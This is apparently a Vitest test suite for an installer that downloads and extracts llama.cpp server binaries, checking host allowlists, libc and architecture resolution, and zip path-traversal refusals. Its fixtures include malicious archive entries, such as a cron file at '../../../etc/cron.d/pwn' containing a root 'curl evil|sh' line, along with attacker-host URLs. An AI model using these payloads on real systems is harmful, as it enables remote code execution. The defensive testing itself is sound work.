/**
 * THE ENGINE INSTALLER — the five refusals that stand between "a release server answered 200" and
 * "this host has a working llama-server", plus the resolution that decides whether a download should
 * be offered here at all.
 *
 * WHY EVERY ONE OF THESE IS A TEST AND NOT A CODE REVIEW: each failure below LOOKS LIKE SUCCESS at
 * the moment it happens. A glibc binary on Alpine extracts perfectly and then fails with a kernel
 * loader error naming a file that plainly exists. An archive with a `../` entry extracts perfectly
 * and writes somewhere nobody looked. A wrong-architecture build extracts perfectly and dies at the
 * first inference, days later, to somebody who was told the install succeeded. None of them
 * announces itself, and this is the only place any of them is cheap to find.
 *
 * ── WHAT IS REAL HERE, AND WHY ──────────────────────────────────────────────────────────────
 *
 * The FILESYSTEM is real and so is the ZIP. These tests build actual zip archives byte by byte —
 * central directory, local headers, deflate and store — and hand them to the real extractor, because
 * a test against a stubbed unzip proves nothing about the traversal refusal that is the entire point
 * of owning the extractor. The archives are assembled by a small writer at the bottom of this file
 * rather than by a library, for the same reason the reader is hand-written: the thing under test is
 * how this code behaves against bytes an attacker could choose.
 *
 * The DATABASE is a small stateful in-memory table rather than `vi.fn()` stubs, because almost every
 * assertion is about what the ROW says after a sequence of writes. Against call-order stubs, "the
 * row ends up failed and nothing is on disk" is not expressible.
 *
 * The NETWORK, the LIBC and the VERSION PROBE are the three things faked, and they are faked exactly
 * because they are the three that would otherwise reach the internet, the host's real loader, or a
 * real llama.cpp binary this machine does not have.
 */
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { deflateRawSync } from "node:zlib";
import { mkdtemp, readFile, rm, stat, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import type { PrismaClient } from "@prisma/client";
import { runInTenant } from "../helpers/tenant-context.js";

const {
  assertAllowedEngineUrl,
  extractEngineZip,
  findManagedEngineBinary,
  readZipEntries,
  runNativeEngineInstall,
  startNativeEngineInstall
} = await import("../../src/services/native-engine.service.js");
type NativeEngineIo = import("../../src/services/native-engine.service.js").NativeEngineIo;

const {
  isNativeEngineHostAllowed,
  nativeEngineEntryProblem,
  nativeEnginePinnedReleaseTag,
  nativeEngineWantedEntry,
  resolveNativeEngineAsset,
  zipMagicProblem
} = await import("@timesheet/shared");

/* ── which build belongs on which machine ───────────────────────────────────────────────────── */

describe("resolving the build for THIS machine", () => {
  it("picks the published asset for each platform and architecture it supports", () => {
    const cases: Array<[string, string, string]> = [
      ["win32", "x64", "win-cpu-x64"],
      ["win32", "arm64", "win-cpu-arm64"],
      ["linux", "x64", "ubuntu-x64"],
      ["linux", "arm64", "ubuntu-arm64"],
      ["darwin", "arm64", "macos-arm64"],
      ["darwin", "x64", "macos-x64"]
    ];
    for (const [platform, arch, fragment] of cases) {
      const resolution = resolveNativeEngineAsset({ platform, arch, libc: platform === "linux" ? "glibc" : null });
      expect(resolution.ok, `${platform}/${arch}`).toBe(true);
      if (!resolution.ok) continue;
      expect(resolution.asset.assetName).toBe(`llama-${nativeEnginePinnedReleaseTag}-bin-${fragment}.zip`);
      // EVERY DERIVED URL LANDS ON AN ALLOWED HOST. Not a tautology: it is the assertion that no
      // future platform entry can introduce a host the downloader would then refuse at the last
      // moment — or, far worse, accept.
      expect(isNativeEngineHostAllowed(new URL(resolution.asset.url).hostname)).toBe(true);
      expect(resolution.asset.url).toContain(`/releases/download/${nativeEnginePinnedReleaseTag}/`);
    }
  });

  it("REFUSES a glibc build on musl, and hands over the sidecar instructions instead", () => {
    // THE ONE THAT MATTERS MOST. `linux/x64` matches a real published asset in every respect except
    // the one deciding whether the file can execute at all. A glibc binary on musl fails with the
    // loader's "no such file or directory" for a file that is plainly there — an hour of somebody's
    // life debugging the wrong thing.
    const resolution = resolveNativeEngineAsset({ platform: "linux", arch: "x64", libc: "musl" });
    expect(resolution.ok).toBe(false);
    if (resolution.ok) return;
    expect(resolution.code).toBe("musl");
    expect(resolution.message).toMatch(/musl/i);
    expect(resolution.message).toMatch(/no such file or directory/i);
    // A dead end is not an acceptable outcome; a specific "not here, do this instead" is.
    expect(resolution.message).toMatch(/NATIVE_AI_RUNTIME_MODE=external/);
  });

  it("checks the libc BEFORE the architecture, so Alpine never falls through to a matching asset", () => {
    // Ordering is the whole defence: arch-first would find `ubuntu-x64` and hand it over.
    const musl = resolveNativeEngineAsset({ platform: "linux", arch: "x64", libc: "musl" });
    expect(musl.ok).toBe(false);
    if (!musl.ok) expect(musl.code).toBe("musl");
  });

  it("refuses an architecture and a platform with no published build, keeping the alternative", () => {
    const arch = resolveNativeEngineAsset({ platform: "linux", arch: "ppc64", libc: "glibc" });
    expect(arch.ok).toBe(false);
    if (!arch.ok) {
      expect(arch.code).toBe("unsupported-arch");
      expect(arch.message).toMatch(/NATIVE_AI_RUNTIME_MODE=external/);
    }
    const platform = resolveNativeEngineAsset({ platform: "sunos", arch: "x64", libc: null });
    expect(platform.ok).toBe(false);
    if (!platform.ok) expect(platform.code).toBe("unsupported-platform");
  });

  it("refuses anything that is not a pinned tag, so nothing can smuggle 'latest' into a URL", () => {
    for (const releaseTag of ["latest", "main", "../../etc", "b1?x=1", ""]) {
      const resolution = resolveNativeEngineAsset({ platform: "linux", arch: "x64", libc: "glibc", releaseTag });
      expect(resolution.ok, releaseTag).toBe(false);
      if (!resolution.ok) expect(resolution.code).toBe("bad-release-tag");
    }
    expect(resolveNativeEngineAsset({ platform: "linux", arch: "x64", libc: "glibc", releaseTag: "b4321" }).ok).toBe(true);
  });

  it("does not treat an UNKNOWN libc as glibc — but does still offer a build", () => {
    // The deliberate middle ground. A `null` libc means "we could not read it", and this is a
    // non-container Linux we know nothing about; the version probe at the end of the install is what
    // catches a binary that cannot load, which is exactly what that step is for.
    const resolution = resolveNativeEngineAsset({ platform: "linux", arch: "x64", libc: null });
    expect(resolution.ok).toBe(true);
  });
});

/* ── where a build may come from ────────────────────────────────────────────────────────────── */

describe("the engine's own host allowlist", () => {
  it("accepts GitHub and the object hosts its release redirects land on", () => {
    expect(isNativeEngineHostAllowed("github.com")).toBe(true);
    expect(isNativeEngineHostAllowed("objects.githubusercontent.com")).toBe(true);
    expect(isNativeEngineHostAllowed("release-assets.githubusercontent.com")).toBe(true);
    expect(isNativeEngineHostAllowed("GitHub.com.")).toBe(true);
  });

  it("refuses the lookalikes a bare endsWith would wave through", () => {
    expect(isNativeEngineHostAllowed("evilgithub.com")).toBe(false);
    expect(isNativeEngineHostAllowed("notgithubusercontent.com")).toBe(false);
    expect(isNativeEngineHostAllowed("github.com.attacker.test")).toBe(false);
    expect(isNativeEngineHostAllowed("localhost")).toBe(false);
    expect(isNativeEngineHostAllowed("169.254.169.254")).toBe(false);
  });

  it("refuses a non-allowlisted host and a plaintext scheme, naming what it refused", () => {
    expect(() => assertAllowedEngineUrl("https://builds.attacker.test/llama.zip")).toThrow(/builds\.attacker\.test/);
    expect(() => assertAllowedEngineUrl("http://github.com/a/releases/download/b1/x.zip")).toThrow(/https/);
    expect(() => assertAllowedEngineUrl("not-a-url")).toThrow(/not a valid download URL/);
  });
});

/* ── what may be written to disk ────────────────────────────────────────────────────────────── */

describe("archive entry names", () => {
  it("refuses traversal, absolute paths, drive letters, UNC and NUL", () => {
    // EXTRACTING AN ARCHIVE FROM THE INTERNET IS EXACTLY WHERE THIS BITES, and `path.join` honours
    // every one of these over the base directory it was given.
    expect(nativeEngineEntryProblem("../../etc/cron.d/pwn")).toMatch(/path-traversal/i);
    expect(nativeEngineEntryProblem("build/../../../root/.ssh/authorized_keys")).toMatch(/path-traversal/i);
    expect(nativeEngineEntryProblem("..\\..\\windows\\system32\\evil.dll")).toMatch(/path-traversal/i);
    expect(nativeEngineEntryProblem("/etc/passwd")).toMatch(/absolute path/i);
    expect(nativeEngineEntryProblem("C:/Windows/System32/evil.dll")).toMatch(/absolute Windows path/i);
    // A UNC path is caught by the leading-slash rule first, which is the right answer arriving via a
    // different sentence — what matters is that it is refused, not which clause got there.
    expect(nativeEngineEntryProblem("//server/share/evil.dll")).toMatch(/refusing to extract/i);
    expect(nativeEngineEntryProblem("build/bin/lla\0ma-server")).toMatch(/NUL byte/i);
    expect(nativeEngineEntryProblem("   ")).toMatch(/empty name/i);
  });

  it("accepts the ordinary layouts upstream actually publishes", () => {
    expect(nativeEngineEntryProblem("build/bin/llama-server")).toBeNull();
    expect(nativeEngineEntryProblem("llama-server.exe")).toBeNull();
    expect(nativeEngineEntryProblem("build/bin/libggml.so.0")).toBeNull();
  });

  it("keeps only the server and its shared libraries, flattened", () => {
    // A release zip carries a dozen example binaries this product never invokes, and each one would
    // be another executable in a directory this process wrote.
    expect(nativeEngineWantedEntry("build/bin/llama-server", "linux")).toEqual({ keep: true, destName: "llama-server" });
    expect(nativeEngineWantedEntry("llama-server.exe", "win32")).toEqual({ keep: true, destName: "llama-server.exe" });
    expect(nativeEngineWantedEntry("build/bin/libggml.so.0", "linux").keep).toBe(true);
    expect(nativeEngineWantedEntry("ggml.dll", "win32").keep).toBe(true);
    expect(nativeEngineWantedEntry("build/bin/libllama.dylib", "darwin").keep).toBe(true);
    expect(nativeEngineWantedEntry("build/bin/llama-cli", "linux").keep).toBe(false);
    expect(nativeEngineWantedEntry("build/bin/llama-quantize", "linux").keep).toBe(false);
    expect(nativeEngineWantedEntry("README.md", "linux").keep).toBe(false);
  });
});

describe("the archive's magic bytes", () => {
  it("accepts a zip and quotes what arrived when it is not one", () => {
    expect(zipMagicProblem(new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x14]))).toBeNull();
    // An error page, a captive portal and an S3 XML error are all 200-shaped responses that save
    // happily under a .zip name. Naming what was there turns "verification failed" into a diagnosis.
    const problem = zipMagicProblem(new Uint8Array(Buffer.from("<!DOCTYPE html><html>", "ascii")));
    expect(problem).toMatch(/not a zip/i);
    expect(problem).toContain("<!DOCTYPE html>");
  });
});

/* ── the extractor, against real bytes ──────────────────────────────────────────────────────── */

let workDir: string;

beforeEach(async () => {
  workDir = await mkdtemp(path.join(os.tmpdir(), "timesphere-engine-"));
  store = fakeClient();
});

afterEach(async () => {
  await rm(workDir, { recursive: true, force: true });
});

async function writeArchive(entries: Array<{ name: string; body: Buffer; store?: boolean }>): Promise<string> {
  const target = path.join(workDir, "engine.zip");
  await writeFile(target, buildZip(entries));
  return target;
}

async function exists(target: string): Promise<boolean> {
  try {
    await stat(target);
    return true;
  } catch {
    return false;
  }
}

describe("extraction", () => {
  it("writes only the wanted entries, flattened, and reads back exactly what went in", async () => {
    const archive = await writeArchive([
      { name: "build/bin/llama-server", body: Buffer.from("#!/real-binary\n".repeat(40)) },
      { name: "build/bin/libggml.so.0", body: Buffer.from("shared-library-bytes") },
      { name: "build/bin/llama-cli", body: Buffer.from("not wanted") },
      { name: "README.md", body: Buffer.from("not wanted either"), store: true }
    ]);
    const destination = path.join(workDir, "out");
    const written = await extractEngineZip(archive, destination, "linux");

    expect(written.map((file) => path.basename(file)).sort()).toEqual(["libggml.so.0", "llama-server"]);
    expect(await readFile(path.join(destination, "llama-server"), "utf8")).toBe("#!/real-binary\n".repeat(40));
    expect(await exists(path.join(destination, "llama-cli"))).toBe(false);
    expect(await exists(path.join(destination, "README.md"))).toBe(false);
  });

  it("REFUSES the whole archive over one traversal entry, and writes nothing at all", async () => {
    // THE REFUSAL THIS EXTRACTOR EXISTS FOR. It runs over EVERY entry before a single byte is
    // written, because checking as it goes would leave whatever came before the bad entry on disk —
    // the half state the refusal is meant to prevent.
    const archive = await writeArchive([
      { name: "build/bin/llama-server", body: Buffer.from("a real server binary") },
      { name: "../../../etc/cron.d/pwn", body: Buffer.from("* * * * * root curl evil|sh") }
    ]);
    const destination = path.join(workDir, "out");
    await expect(extractEngineZip(archive, destination, "linux")).rejects.toThrow(/path-traversal/i);
    // Not "the traversal entry was skipped" — NOTHING was written, including the legitimate file
    // that came first in the directory.
    expect(await exists(path.join(destination, "llama-server"))).toBe(false);
  });

  it("refuses an absolute entry, which path.join would honour over its own base", async () => {
    const archive = await writeArchive([{ name: "/etc/passwd", body: Buffer.from("root:x:0:0") }]);
    await expect(extractEngineZip(archive, path.join(workDir, "out"), "linux")).rejects.toThrow(/absolute path/i);
  });

  it("refuses a compression method it does not implement rather than writing the raw bytes out", async () => {
    const archive = buildZip([{ name: "build/bin/llama-server", body: Buffer.from("x"), method: 99 }]);
    const target = path.join(workDir, "odd.zip");
    await writeFile(target, archive);
    await expect(extractEngineZip(target, path.join(workDir, "out"), "linux")).rejects.toThrow(/method 99/);
  });

  it("refuses a file with no end-of-directory record instead of guessing at its contents", async () => {
    const target = path.join(workDir, "truncated.zip");
    await writeFile(target, Buffer.from("PK\u0003\u0004 and then nothing that makes sense"));
    await expect(extractEngineZip(target, path.join(workDir, "out"), "linux")).rejects.toThrow(/end-of-directory/i);
  });

  it("parses the entries a real release layout would have", async () => {
    const archive = buildZip([
      { name: "build/bin/llama-server", body: Buffer.from("server") },
      { name: "build/bin/libllama.so", body: Buffer.from("lib") }
    ]);
    expect(readZipEntries(archive).map((entry) => entry.name)).toEqual(["build/bin/llama-server", "build/bin/libllama.so"]);
  });
});

/* ── the whole job, end to end ──────────────────────────────────────────────────────────────── */

type Row = Record<string, unknown> & { id: string; status: string };
let store: ReturnType<typeof fakeClient>;

function fakeClient(): { client: PrismaClient; rows: Map<string, Row> } {
  const rows = new Map<string, Row>();
  let nextId = 1;
  const newest = (): Row | null => [...rows.values()].sort((a, b) => Number(b.createdAt) - Number(a.createdAt))[0] ?? null;

  const table = {
    findFirst: async () => newest(),
    findUnique: async ({ where }: { where: { id: string } }) => rows.get(where.id) ?? null,
    create: async ({ data }: { data: Row }) => {
      const row = { id: `install-${nextId++}`, createdAt: new Date(), updatedAt: new Date(), ...data } as Row;
      rows.set(row.id, row);
      return row;
    },
    update: async ({ where, data }: { where: { id: string }; data: Row }) => {
      const existing = rows.get(where.id);
      if (!existing) throw new Error("Record to update not found.");
      Object.assign(existing, data, { updatedAt: new Date() });
      return existing;
    },
    /** The CONDITIONAL write — a status guard in the WHERE clause, which is how the transfer
     *  advances a row to `downloading` without clobbering a `cancelled` that landed while the socket
     *  was opening. Modelled rather than stubbed, because "count 0 and the row untouched" is the
     *  behaviour being relied on. */
    updateMany: async ({ where, data }: { where: { id?: string; status?: { in: string[] } }; data: Row }) => {
      const existing = where.id ? rows.get(where.id) : newest();
      if (!existing) return { count: 0 };
      if (where.status && !where.status.in.includes(String(existing.status))) return { count: 0 };
      Object.assign(existing, data, { updatedAt: new Date() });
      return { count: 1 };
    },
    deleteMany: async () => {
      const count = rows.size;
      rows.clear();
      return { count };
    }
  };
  return { client: { nativeEngineInstall: table } as unknown as PrismaClient, rows };
}

interface IoOptions {
  fetch?: NativeEngineIo["fetch"];
  libc?: "glibc" | "musl" | null;
  platform?: NodeJS.Platform;
  arch?: string;
  probe?: NativeEngineIo["probeBinary"];
}

let probeCalls: string[] = [];

function makeIo(options: IoOptions = {}): NativeEngineIo {
  return {
    fetch: options.fetch ?? (async () => new Response(buildRealisticZip(), { headers: { "content-length": "999" } })),
    assertEgress: async () => undefined,
    platform: () => options.platform ?? "linux",
    arch: () => options.arch ?? "x64",
    libc: async () => options.libc ?? "glibc",
    engineDirectory: (tag) => path.join(workDir, "engine", tag),
    engineRoot: () => path.join(workDir, "engine"),
    releaseTag: () => nativeEnginePinnedReleaseTag,
    probeBinary:
      options.probe ??
      (async (binaryPath) => {
        probeCalls.push(binaryPath);
        return { ok: true, output: `version: 6099 (abc1234)\nbuilt with gcc` };
      })
  };
}

/** A zip shaped like a real llama.cpp Linux release: the server, a shared library, and a couple of
 *  example binaries this installer must leave behind. */
function buildRealisticZip(): Uint8Array {
  return new Uint8Array(
    buildZip([
      { name: "build/bin/llama-server", body: Buffer.from("ELF-ish server bytes".repeat(10)) },
      { name: "build/bin/libggml.so", body: Buffer.from("ggml bytes".repeat(10)) },
      { name: "build/bin/llama-cli", body: Buffer.from("cli bytes") }
    ])
  );
}

const ASSET = { assetName: "llama-b6099-bin-ubuntu-x64.zip", url: "https://github.com/ggml-org/llama.cpp/releases/download/b6099/llama-b6099-bin-ubuntu-x64.zip", releaseTag: nativeEnginePinnedReleaseTag, approximateBytes: 22 * 1024 * 1024, archiveFormat: "zip" as const };

async function seedQueuedRow(): Promise<string> {
  const row = await runInTenant(store.client, () =>
    (store.client as unknown as { nativeEngineInstall: { create: (args: unknown) => Promise<Row> } }).nativeEngineInstall.create({
      data: {
        status: "queued",
        releaseTag: ASSET.releaseTag,
        assetName: ASSET.assetName,
        sourceUrl: ASSET.url,
        bytesDownloaded: 0,
        bytesTotal: null,
        fileSizeBytes: null,
        sha256: null,
        binaryPath: null,
        versionOutput: null,
        error: null
      }
    })
  );
  return row.id;
}

beforeEach(() => {
  probeCalls = [];
});

describe("the install, end to end", () => {
  it("downloads, verifies, extracts, RUNS the binary and only then reports ready", async () => {
    const id = await seedQueuedRow();
    const io = makeIo();
    await runInTenant(store.client, () => runNativeEngineInstall(id, ASSET, io));

    const row = store.rows.get(id)!;
    expect(row.status).toBe("ready");
    // THE PROOF THAT IT RUNS. Not "a file appeared" — the installer spawned it and got an answer.
    expect(probeCalls).toEqual([path.join(workDir, "engine", ASSET.releaseTag, "llama-server")]);
    expect(row.binaryPath).toBe(path.join(workDir, "engine", ASSET.releaseTag, "llama-server"));
    expect(row.versionOutput).toContain("version: 6099");
    // MEASURED and RECORDED, never the resolver's ballpark.
    expect(row.fileSizeBytes).toBeGreaterThan(0);
    expect(String(row.sha256)).toMatch(/^[0-9a-f]{64}$/);
    // The example binary in the same archive is not installed.
    expect(await exists(path.join(workDir, "engine", ASSET.releaseTag, "llama-cli"))).toBe(false);
    // And the temp archive does not survive a success.
    expect(await exists(path.join(workDir, "engine", ASSET.releaseTag, `engine-${ASSET.releaseTag}.zip.part`))).toBe(false);
  });

  it("REFUSES TO DECLARE INSTALLED when the binary does not answer, and removes what it extracted", async () => {
    // The step most often skipped, and the one that separates "the archive extracted" from "this
    // host has a working llama-server". A wrong-architecture binary, a missing shared library and an
    // ABI mismatch all extract perfectly.
    const id = await seedQueuedRow();
    const io = makeIo({
      probe: async () => ({ ok: false, message: "it exited with code 127 and printed nothing — usually a binary for the wrong architecture." })
    });
    await runInTenant(store.client, () => runNativeEngineInstall(id, ASSET, io));

    const row = store.rows.get(id)!;
    expect(row.status).toBe("failed");
    expect(row.binaryPath).toBeNull();
    expect(String(row.error)).toMatch(/did not answer when it was run/i);
    // A directory holding a binary that does not run is a directory `resolveServerBinary` would find
    // and hand to spawn on the next start — turning a failed install into a runtime that fails
    // mysteriously for as long as it sits there.
    expect(await exists(path.join(workDir, "engine", ASSET.releaseTag, "llama-server"))).toBe(false);
  });

  it("fails the install when the archive contains a traversal entry, and installs nothing", async () => {
    const id = await seedQueuedRow();
    const evil = buildZip([
      { name: "build/bin/llama-server", body: Buffer.from("looks fine") },
      { name: "../../../etc/cron.d/pwn", body: Buffer.from("* * * * * root curl evil|sh") }
    ]);
    const io = makeIo({ fetch: async () => new Response(new Uint8Array(evil), { headers: { "content-length": String(evil.length) } }) });
    await runInTenant(store.client, () => runNativeEngineInstall(id, ASSET, io));

    const row = store.rows.get(id)!;
    expect(row.status).toBe("failed");
    expect(String(row.error)).toMatch(/path-traversal/i);
    // The version probe never ran, because there was never anything legitimate to probe.
    expect(probeCalls).toEqual([]);
    expect(await exists(path.join(workDir, "engine", ASSET.releaseTag, "llama-server"))).toBe(false);
  });

  it("fails on a body that is not an archive, quoting what actually arrived", async () => {
    const id = await seedQueuedRow();
    const page = Buffer.from("<!DOCTYPE html><title>404 Not Found</title>");
    const io = makeIo({ fetch: async () => new Response(new Uint8Array(page), { headers: { "content-length": String(page.length) } }) });
    await runInTenant(store.client, () => runNativeEngineInstall(id, ASSET, io));

    const row = store.rows.get(id)!;
    expect(row.status).toBe("failed");
    expect(String(row.error)).toMatch(/not a zip/i);
    expect(String(row.error)).toContain("<!DOCTYPE html>");
  });

  it("refuses a redirect off the allowlist mid-transfer", async () => {
    // Following one blindly is what makes an allowlist decorative — and GitHub genuinely does
    // redirect release assets, so refusing redirects outright is not an option.
    const id = await seedQueuedRow();
    const seen: string[] = [];
    const io = makeIo({
      fetch: async (url) => {
        seen.push(url);
        if (seen.length === 1) return new Response(null, { status: 302, headers: { location: "https://cdn.attacker.test/llama.zip" } });
        return new Response(buildRealisticZip());
      }
    });
    await runInTenant(store.client, () => runNativeEngineInstall(id, ASSET, io));

    const row = store.rows.get(id)!;
    expect(row.status).toBe("failed");
    expect(String(row.error)).toMatch(/cdn\.attacker\.test/);
    // The second hop was never requested at all.
    expect(seen).toHaveLength(1);
  });

  it("fails with the release named when the server does not have the pinned asset", async () => {
    const id = await seedQueuedRow();
    const io = makeIo({ fetch: async () => new Response(null, { status: 404, statusText: "Not Found" }) });
    await runInTenant(store.client, () => runNativeEngineInstall(id, ASSET, io));
    const row = store.rows.get(id)!;
    expect(row.status).toBe("failed");
    expect(String(row.error)).toContain(nativeEnginePinnedReleaseTag);
    expect(String(row.error)).toMatch(/NATIVE_AI_ENGINE_RELEASE/);
  });
});

describe("what an install is refused before a row even exists", () => {
  it("refuses on musl with the sidecar instructions, rather than creating a job that fails later", async () => {
    await expect(runInTenant(store.client, () => startNativeEngineInstall("embedded", "user-1", makeIo({ libc: "musl" })))).rejects.toThrow(
      /musl/i
    );
    expect(store.rows.size).toBe(0);
  });

  it("refuses in external and off modes, where a local binary would sit unused", async () => {
    await expect(runInTenant(store.client, () => startNativeEngineInstall("external", "user-1", makeIo()))).rejects.toThrow(/external/);
    await expect(runInTenant(store.client, () => startNativeEngineInstall("off", "user-1", makeIo()))).rejects.toThrow(/embedded/);
    expect(store.rows.size).toBe(0);
  });
});

describe("finding an engine a previous install left behind", () => {
  /* Paths built with `path.join` rather than written as POSIX literals — the same lesson
     native-runtime-supervisor.test.ts records: the resolver joins a directory to a file name, and on
     Windows that yields backslashes, so hard-coded forward slashes would make this suite look like a
     machine with nothing installed on it. */
  const ROOT = path.join("srv", "engine");
  const directoryFor = (tag: string) => path.join(ROOT, tag);
  const binaryIn = (tag: string) => path.join(directoryFor(tag), "llama-server");

  it("prefers the pinned release", () => {
    const found = findManagedEngineBinary(
      (target) => target === binaryIn("b6099") || target === binaryIn("b5000"),
      () => ["b6099", "b5000"],
      "linux",
      "b6099",
      ROOT,
      directoryFor
    );
    expect(found).toBe(binaryIn("b6099"));
  });

  it("falls back to the newest other release, so bumping the pin does not break a working box", () => {
    // An older engine that runs is worth more than a newer one that is not there.
    const found = findManagedEngineBinary((target) => target === binaryIn("b5000"), () => ["b4000", "b5000"], "linux", "b6099", ROOT, directoryFor);
    expect(found).toBe(binaryIn("b5000"));
  });

  it("returns null when nothing is installed, which is every fresh deployment", () => {
    expect(findManagedEngineBinary(() => false, () => [], "linux", "b6099", ROOT, directoryFor)).toBeNull();
  });
});

/* ── a zip writer, so the tests drive the real reader against real bytes ────────────────────── */

/**
 * The smallest correct zip writer that can express what these tests need: store and deflate, one
 * central directory, no zip64, no data descriptors.
 *
 * WHY BY HAND. The extractor under test is hand-written precisely so the traversal refusal is a
 * property of code this repository owns; generating the fixtures with a library would leave the
 * interesting cases (an entry name no library will write for you) unreachable.
 */
function buildZip(entries: Array<{ name: string; body: Buffer; store?: boolean; method?: number }>): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const entry of entries) {
    const name = Buffer.from(entry.name, "utf8");
    const method = entry.method ?? (entry.store ? 0 : 8);
    const payload = method === 8 ? deflateRawSync(entry.body) : entry.body;

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(0, 14);
    local.writeUInt32LE(payload.length, 18);
    local.writeUInt32LE(entry.body.length, 22);
    local.writeUInt16LE(name.length, 26);
    locals.push(local, name, payload);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(0, 16);
    central.writeUInt32LE(payload.length, 20);
    central.writeUInt32LE(entry.body.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, name);

    offset += 30 + name.length + payload.length;
  }

  const directory = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(directory.length, 12);
  eocd.writeUInt32LE(offset, 16);

  return Buffer.concat([...locals, directory, eocd]);
}
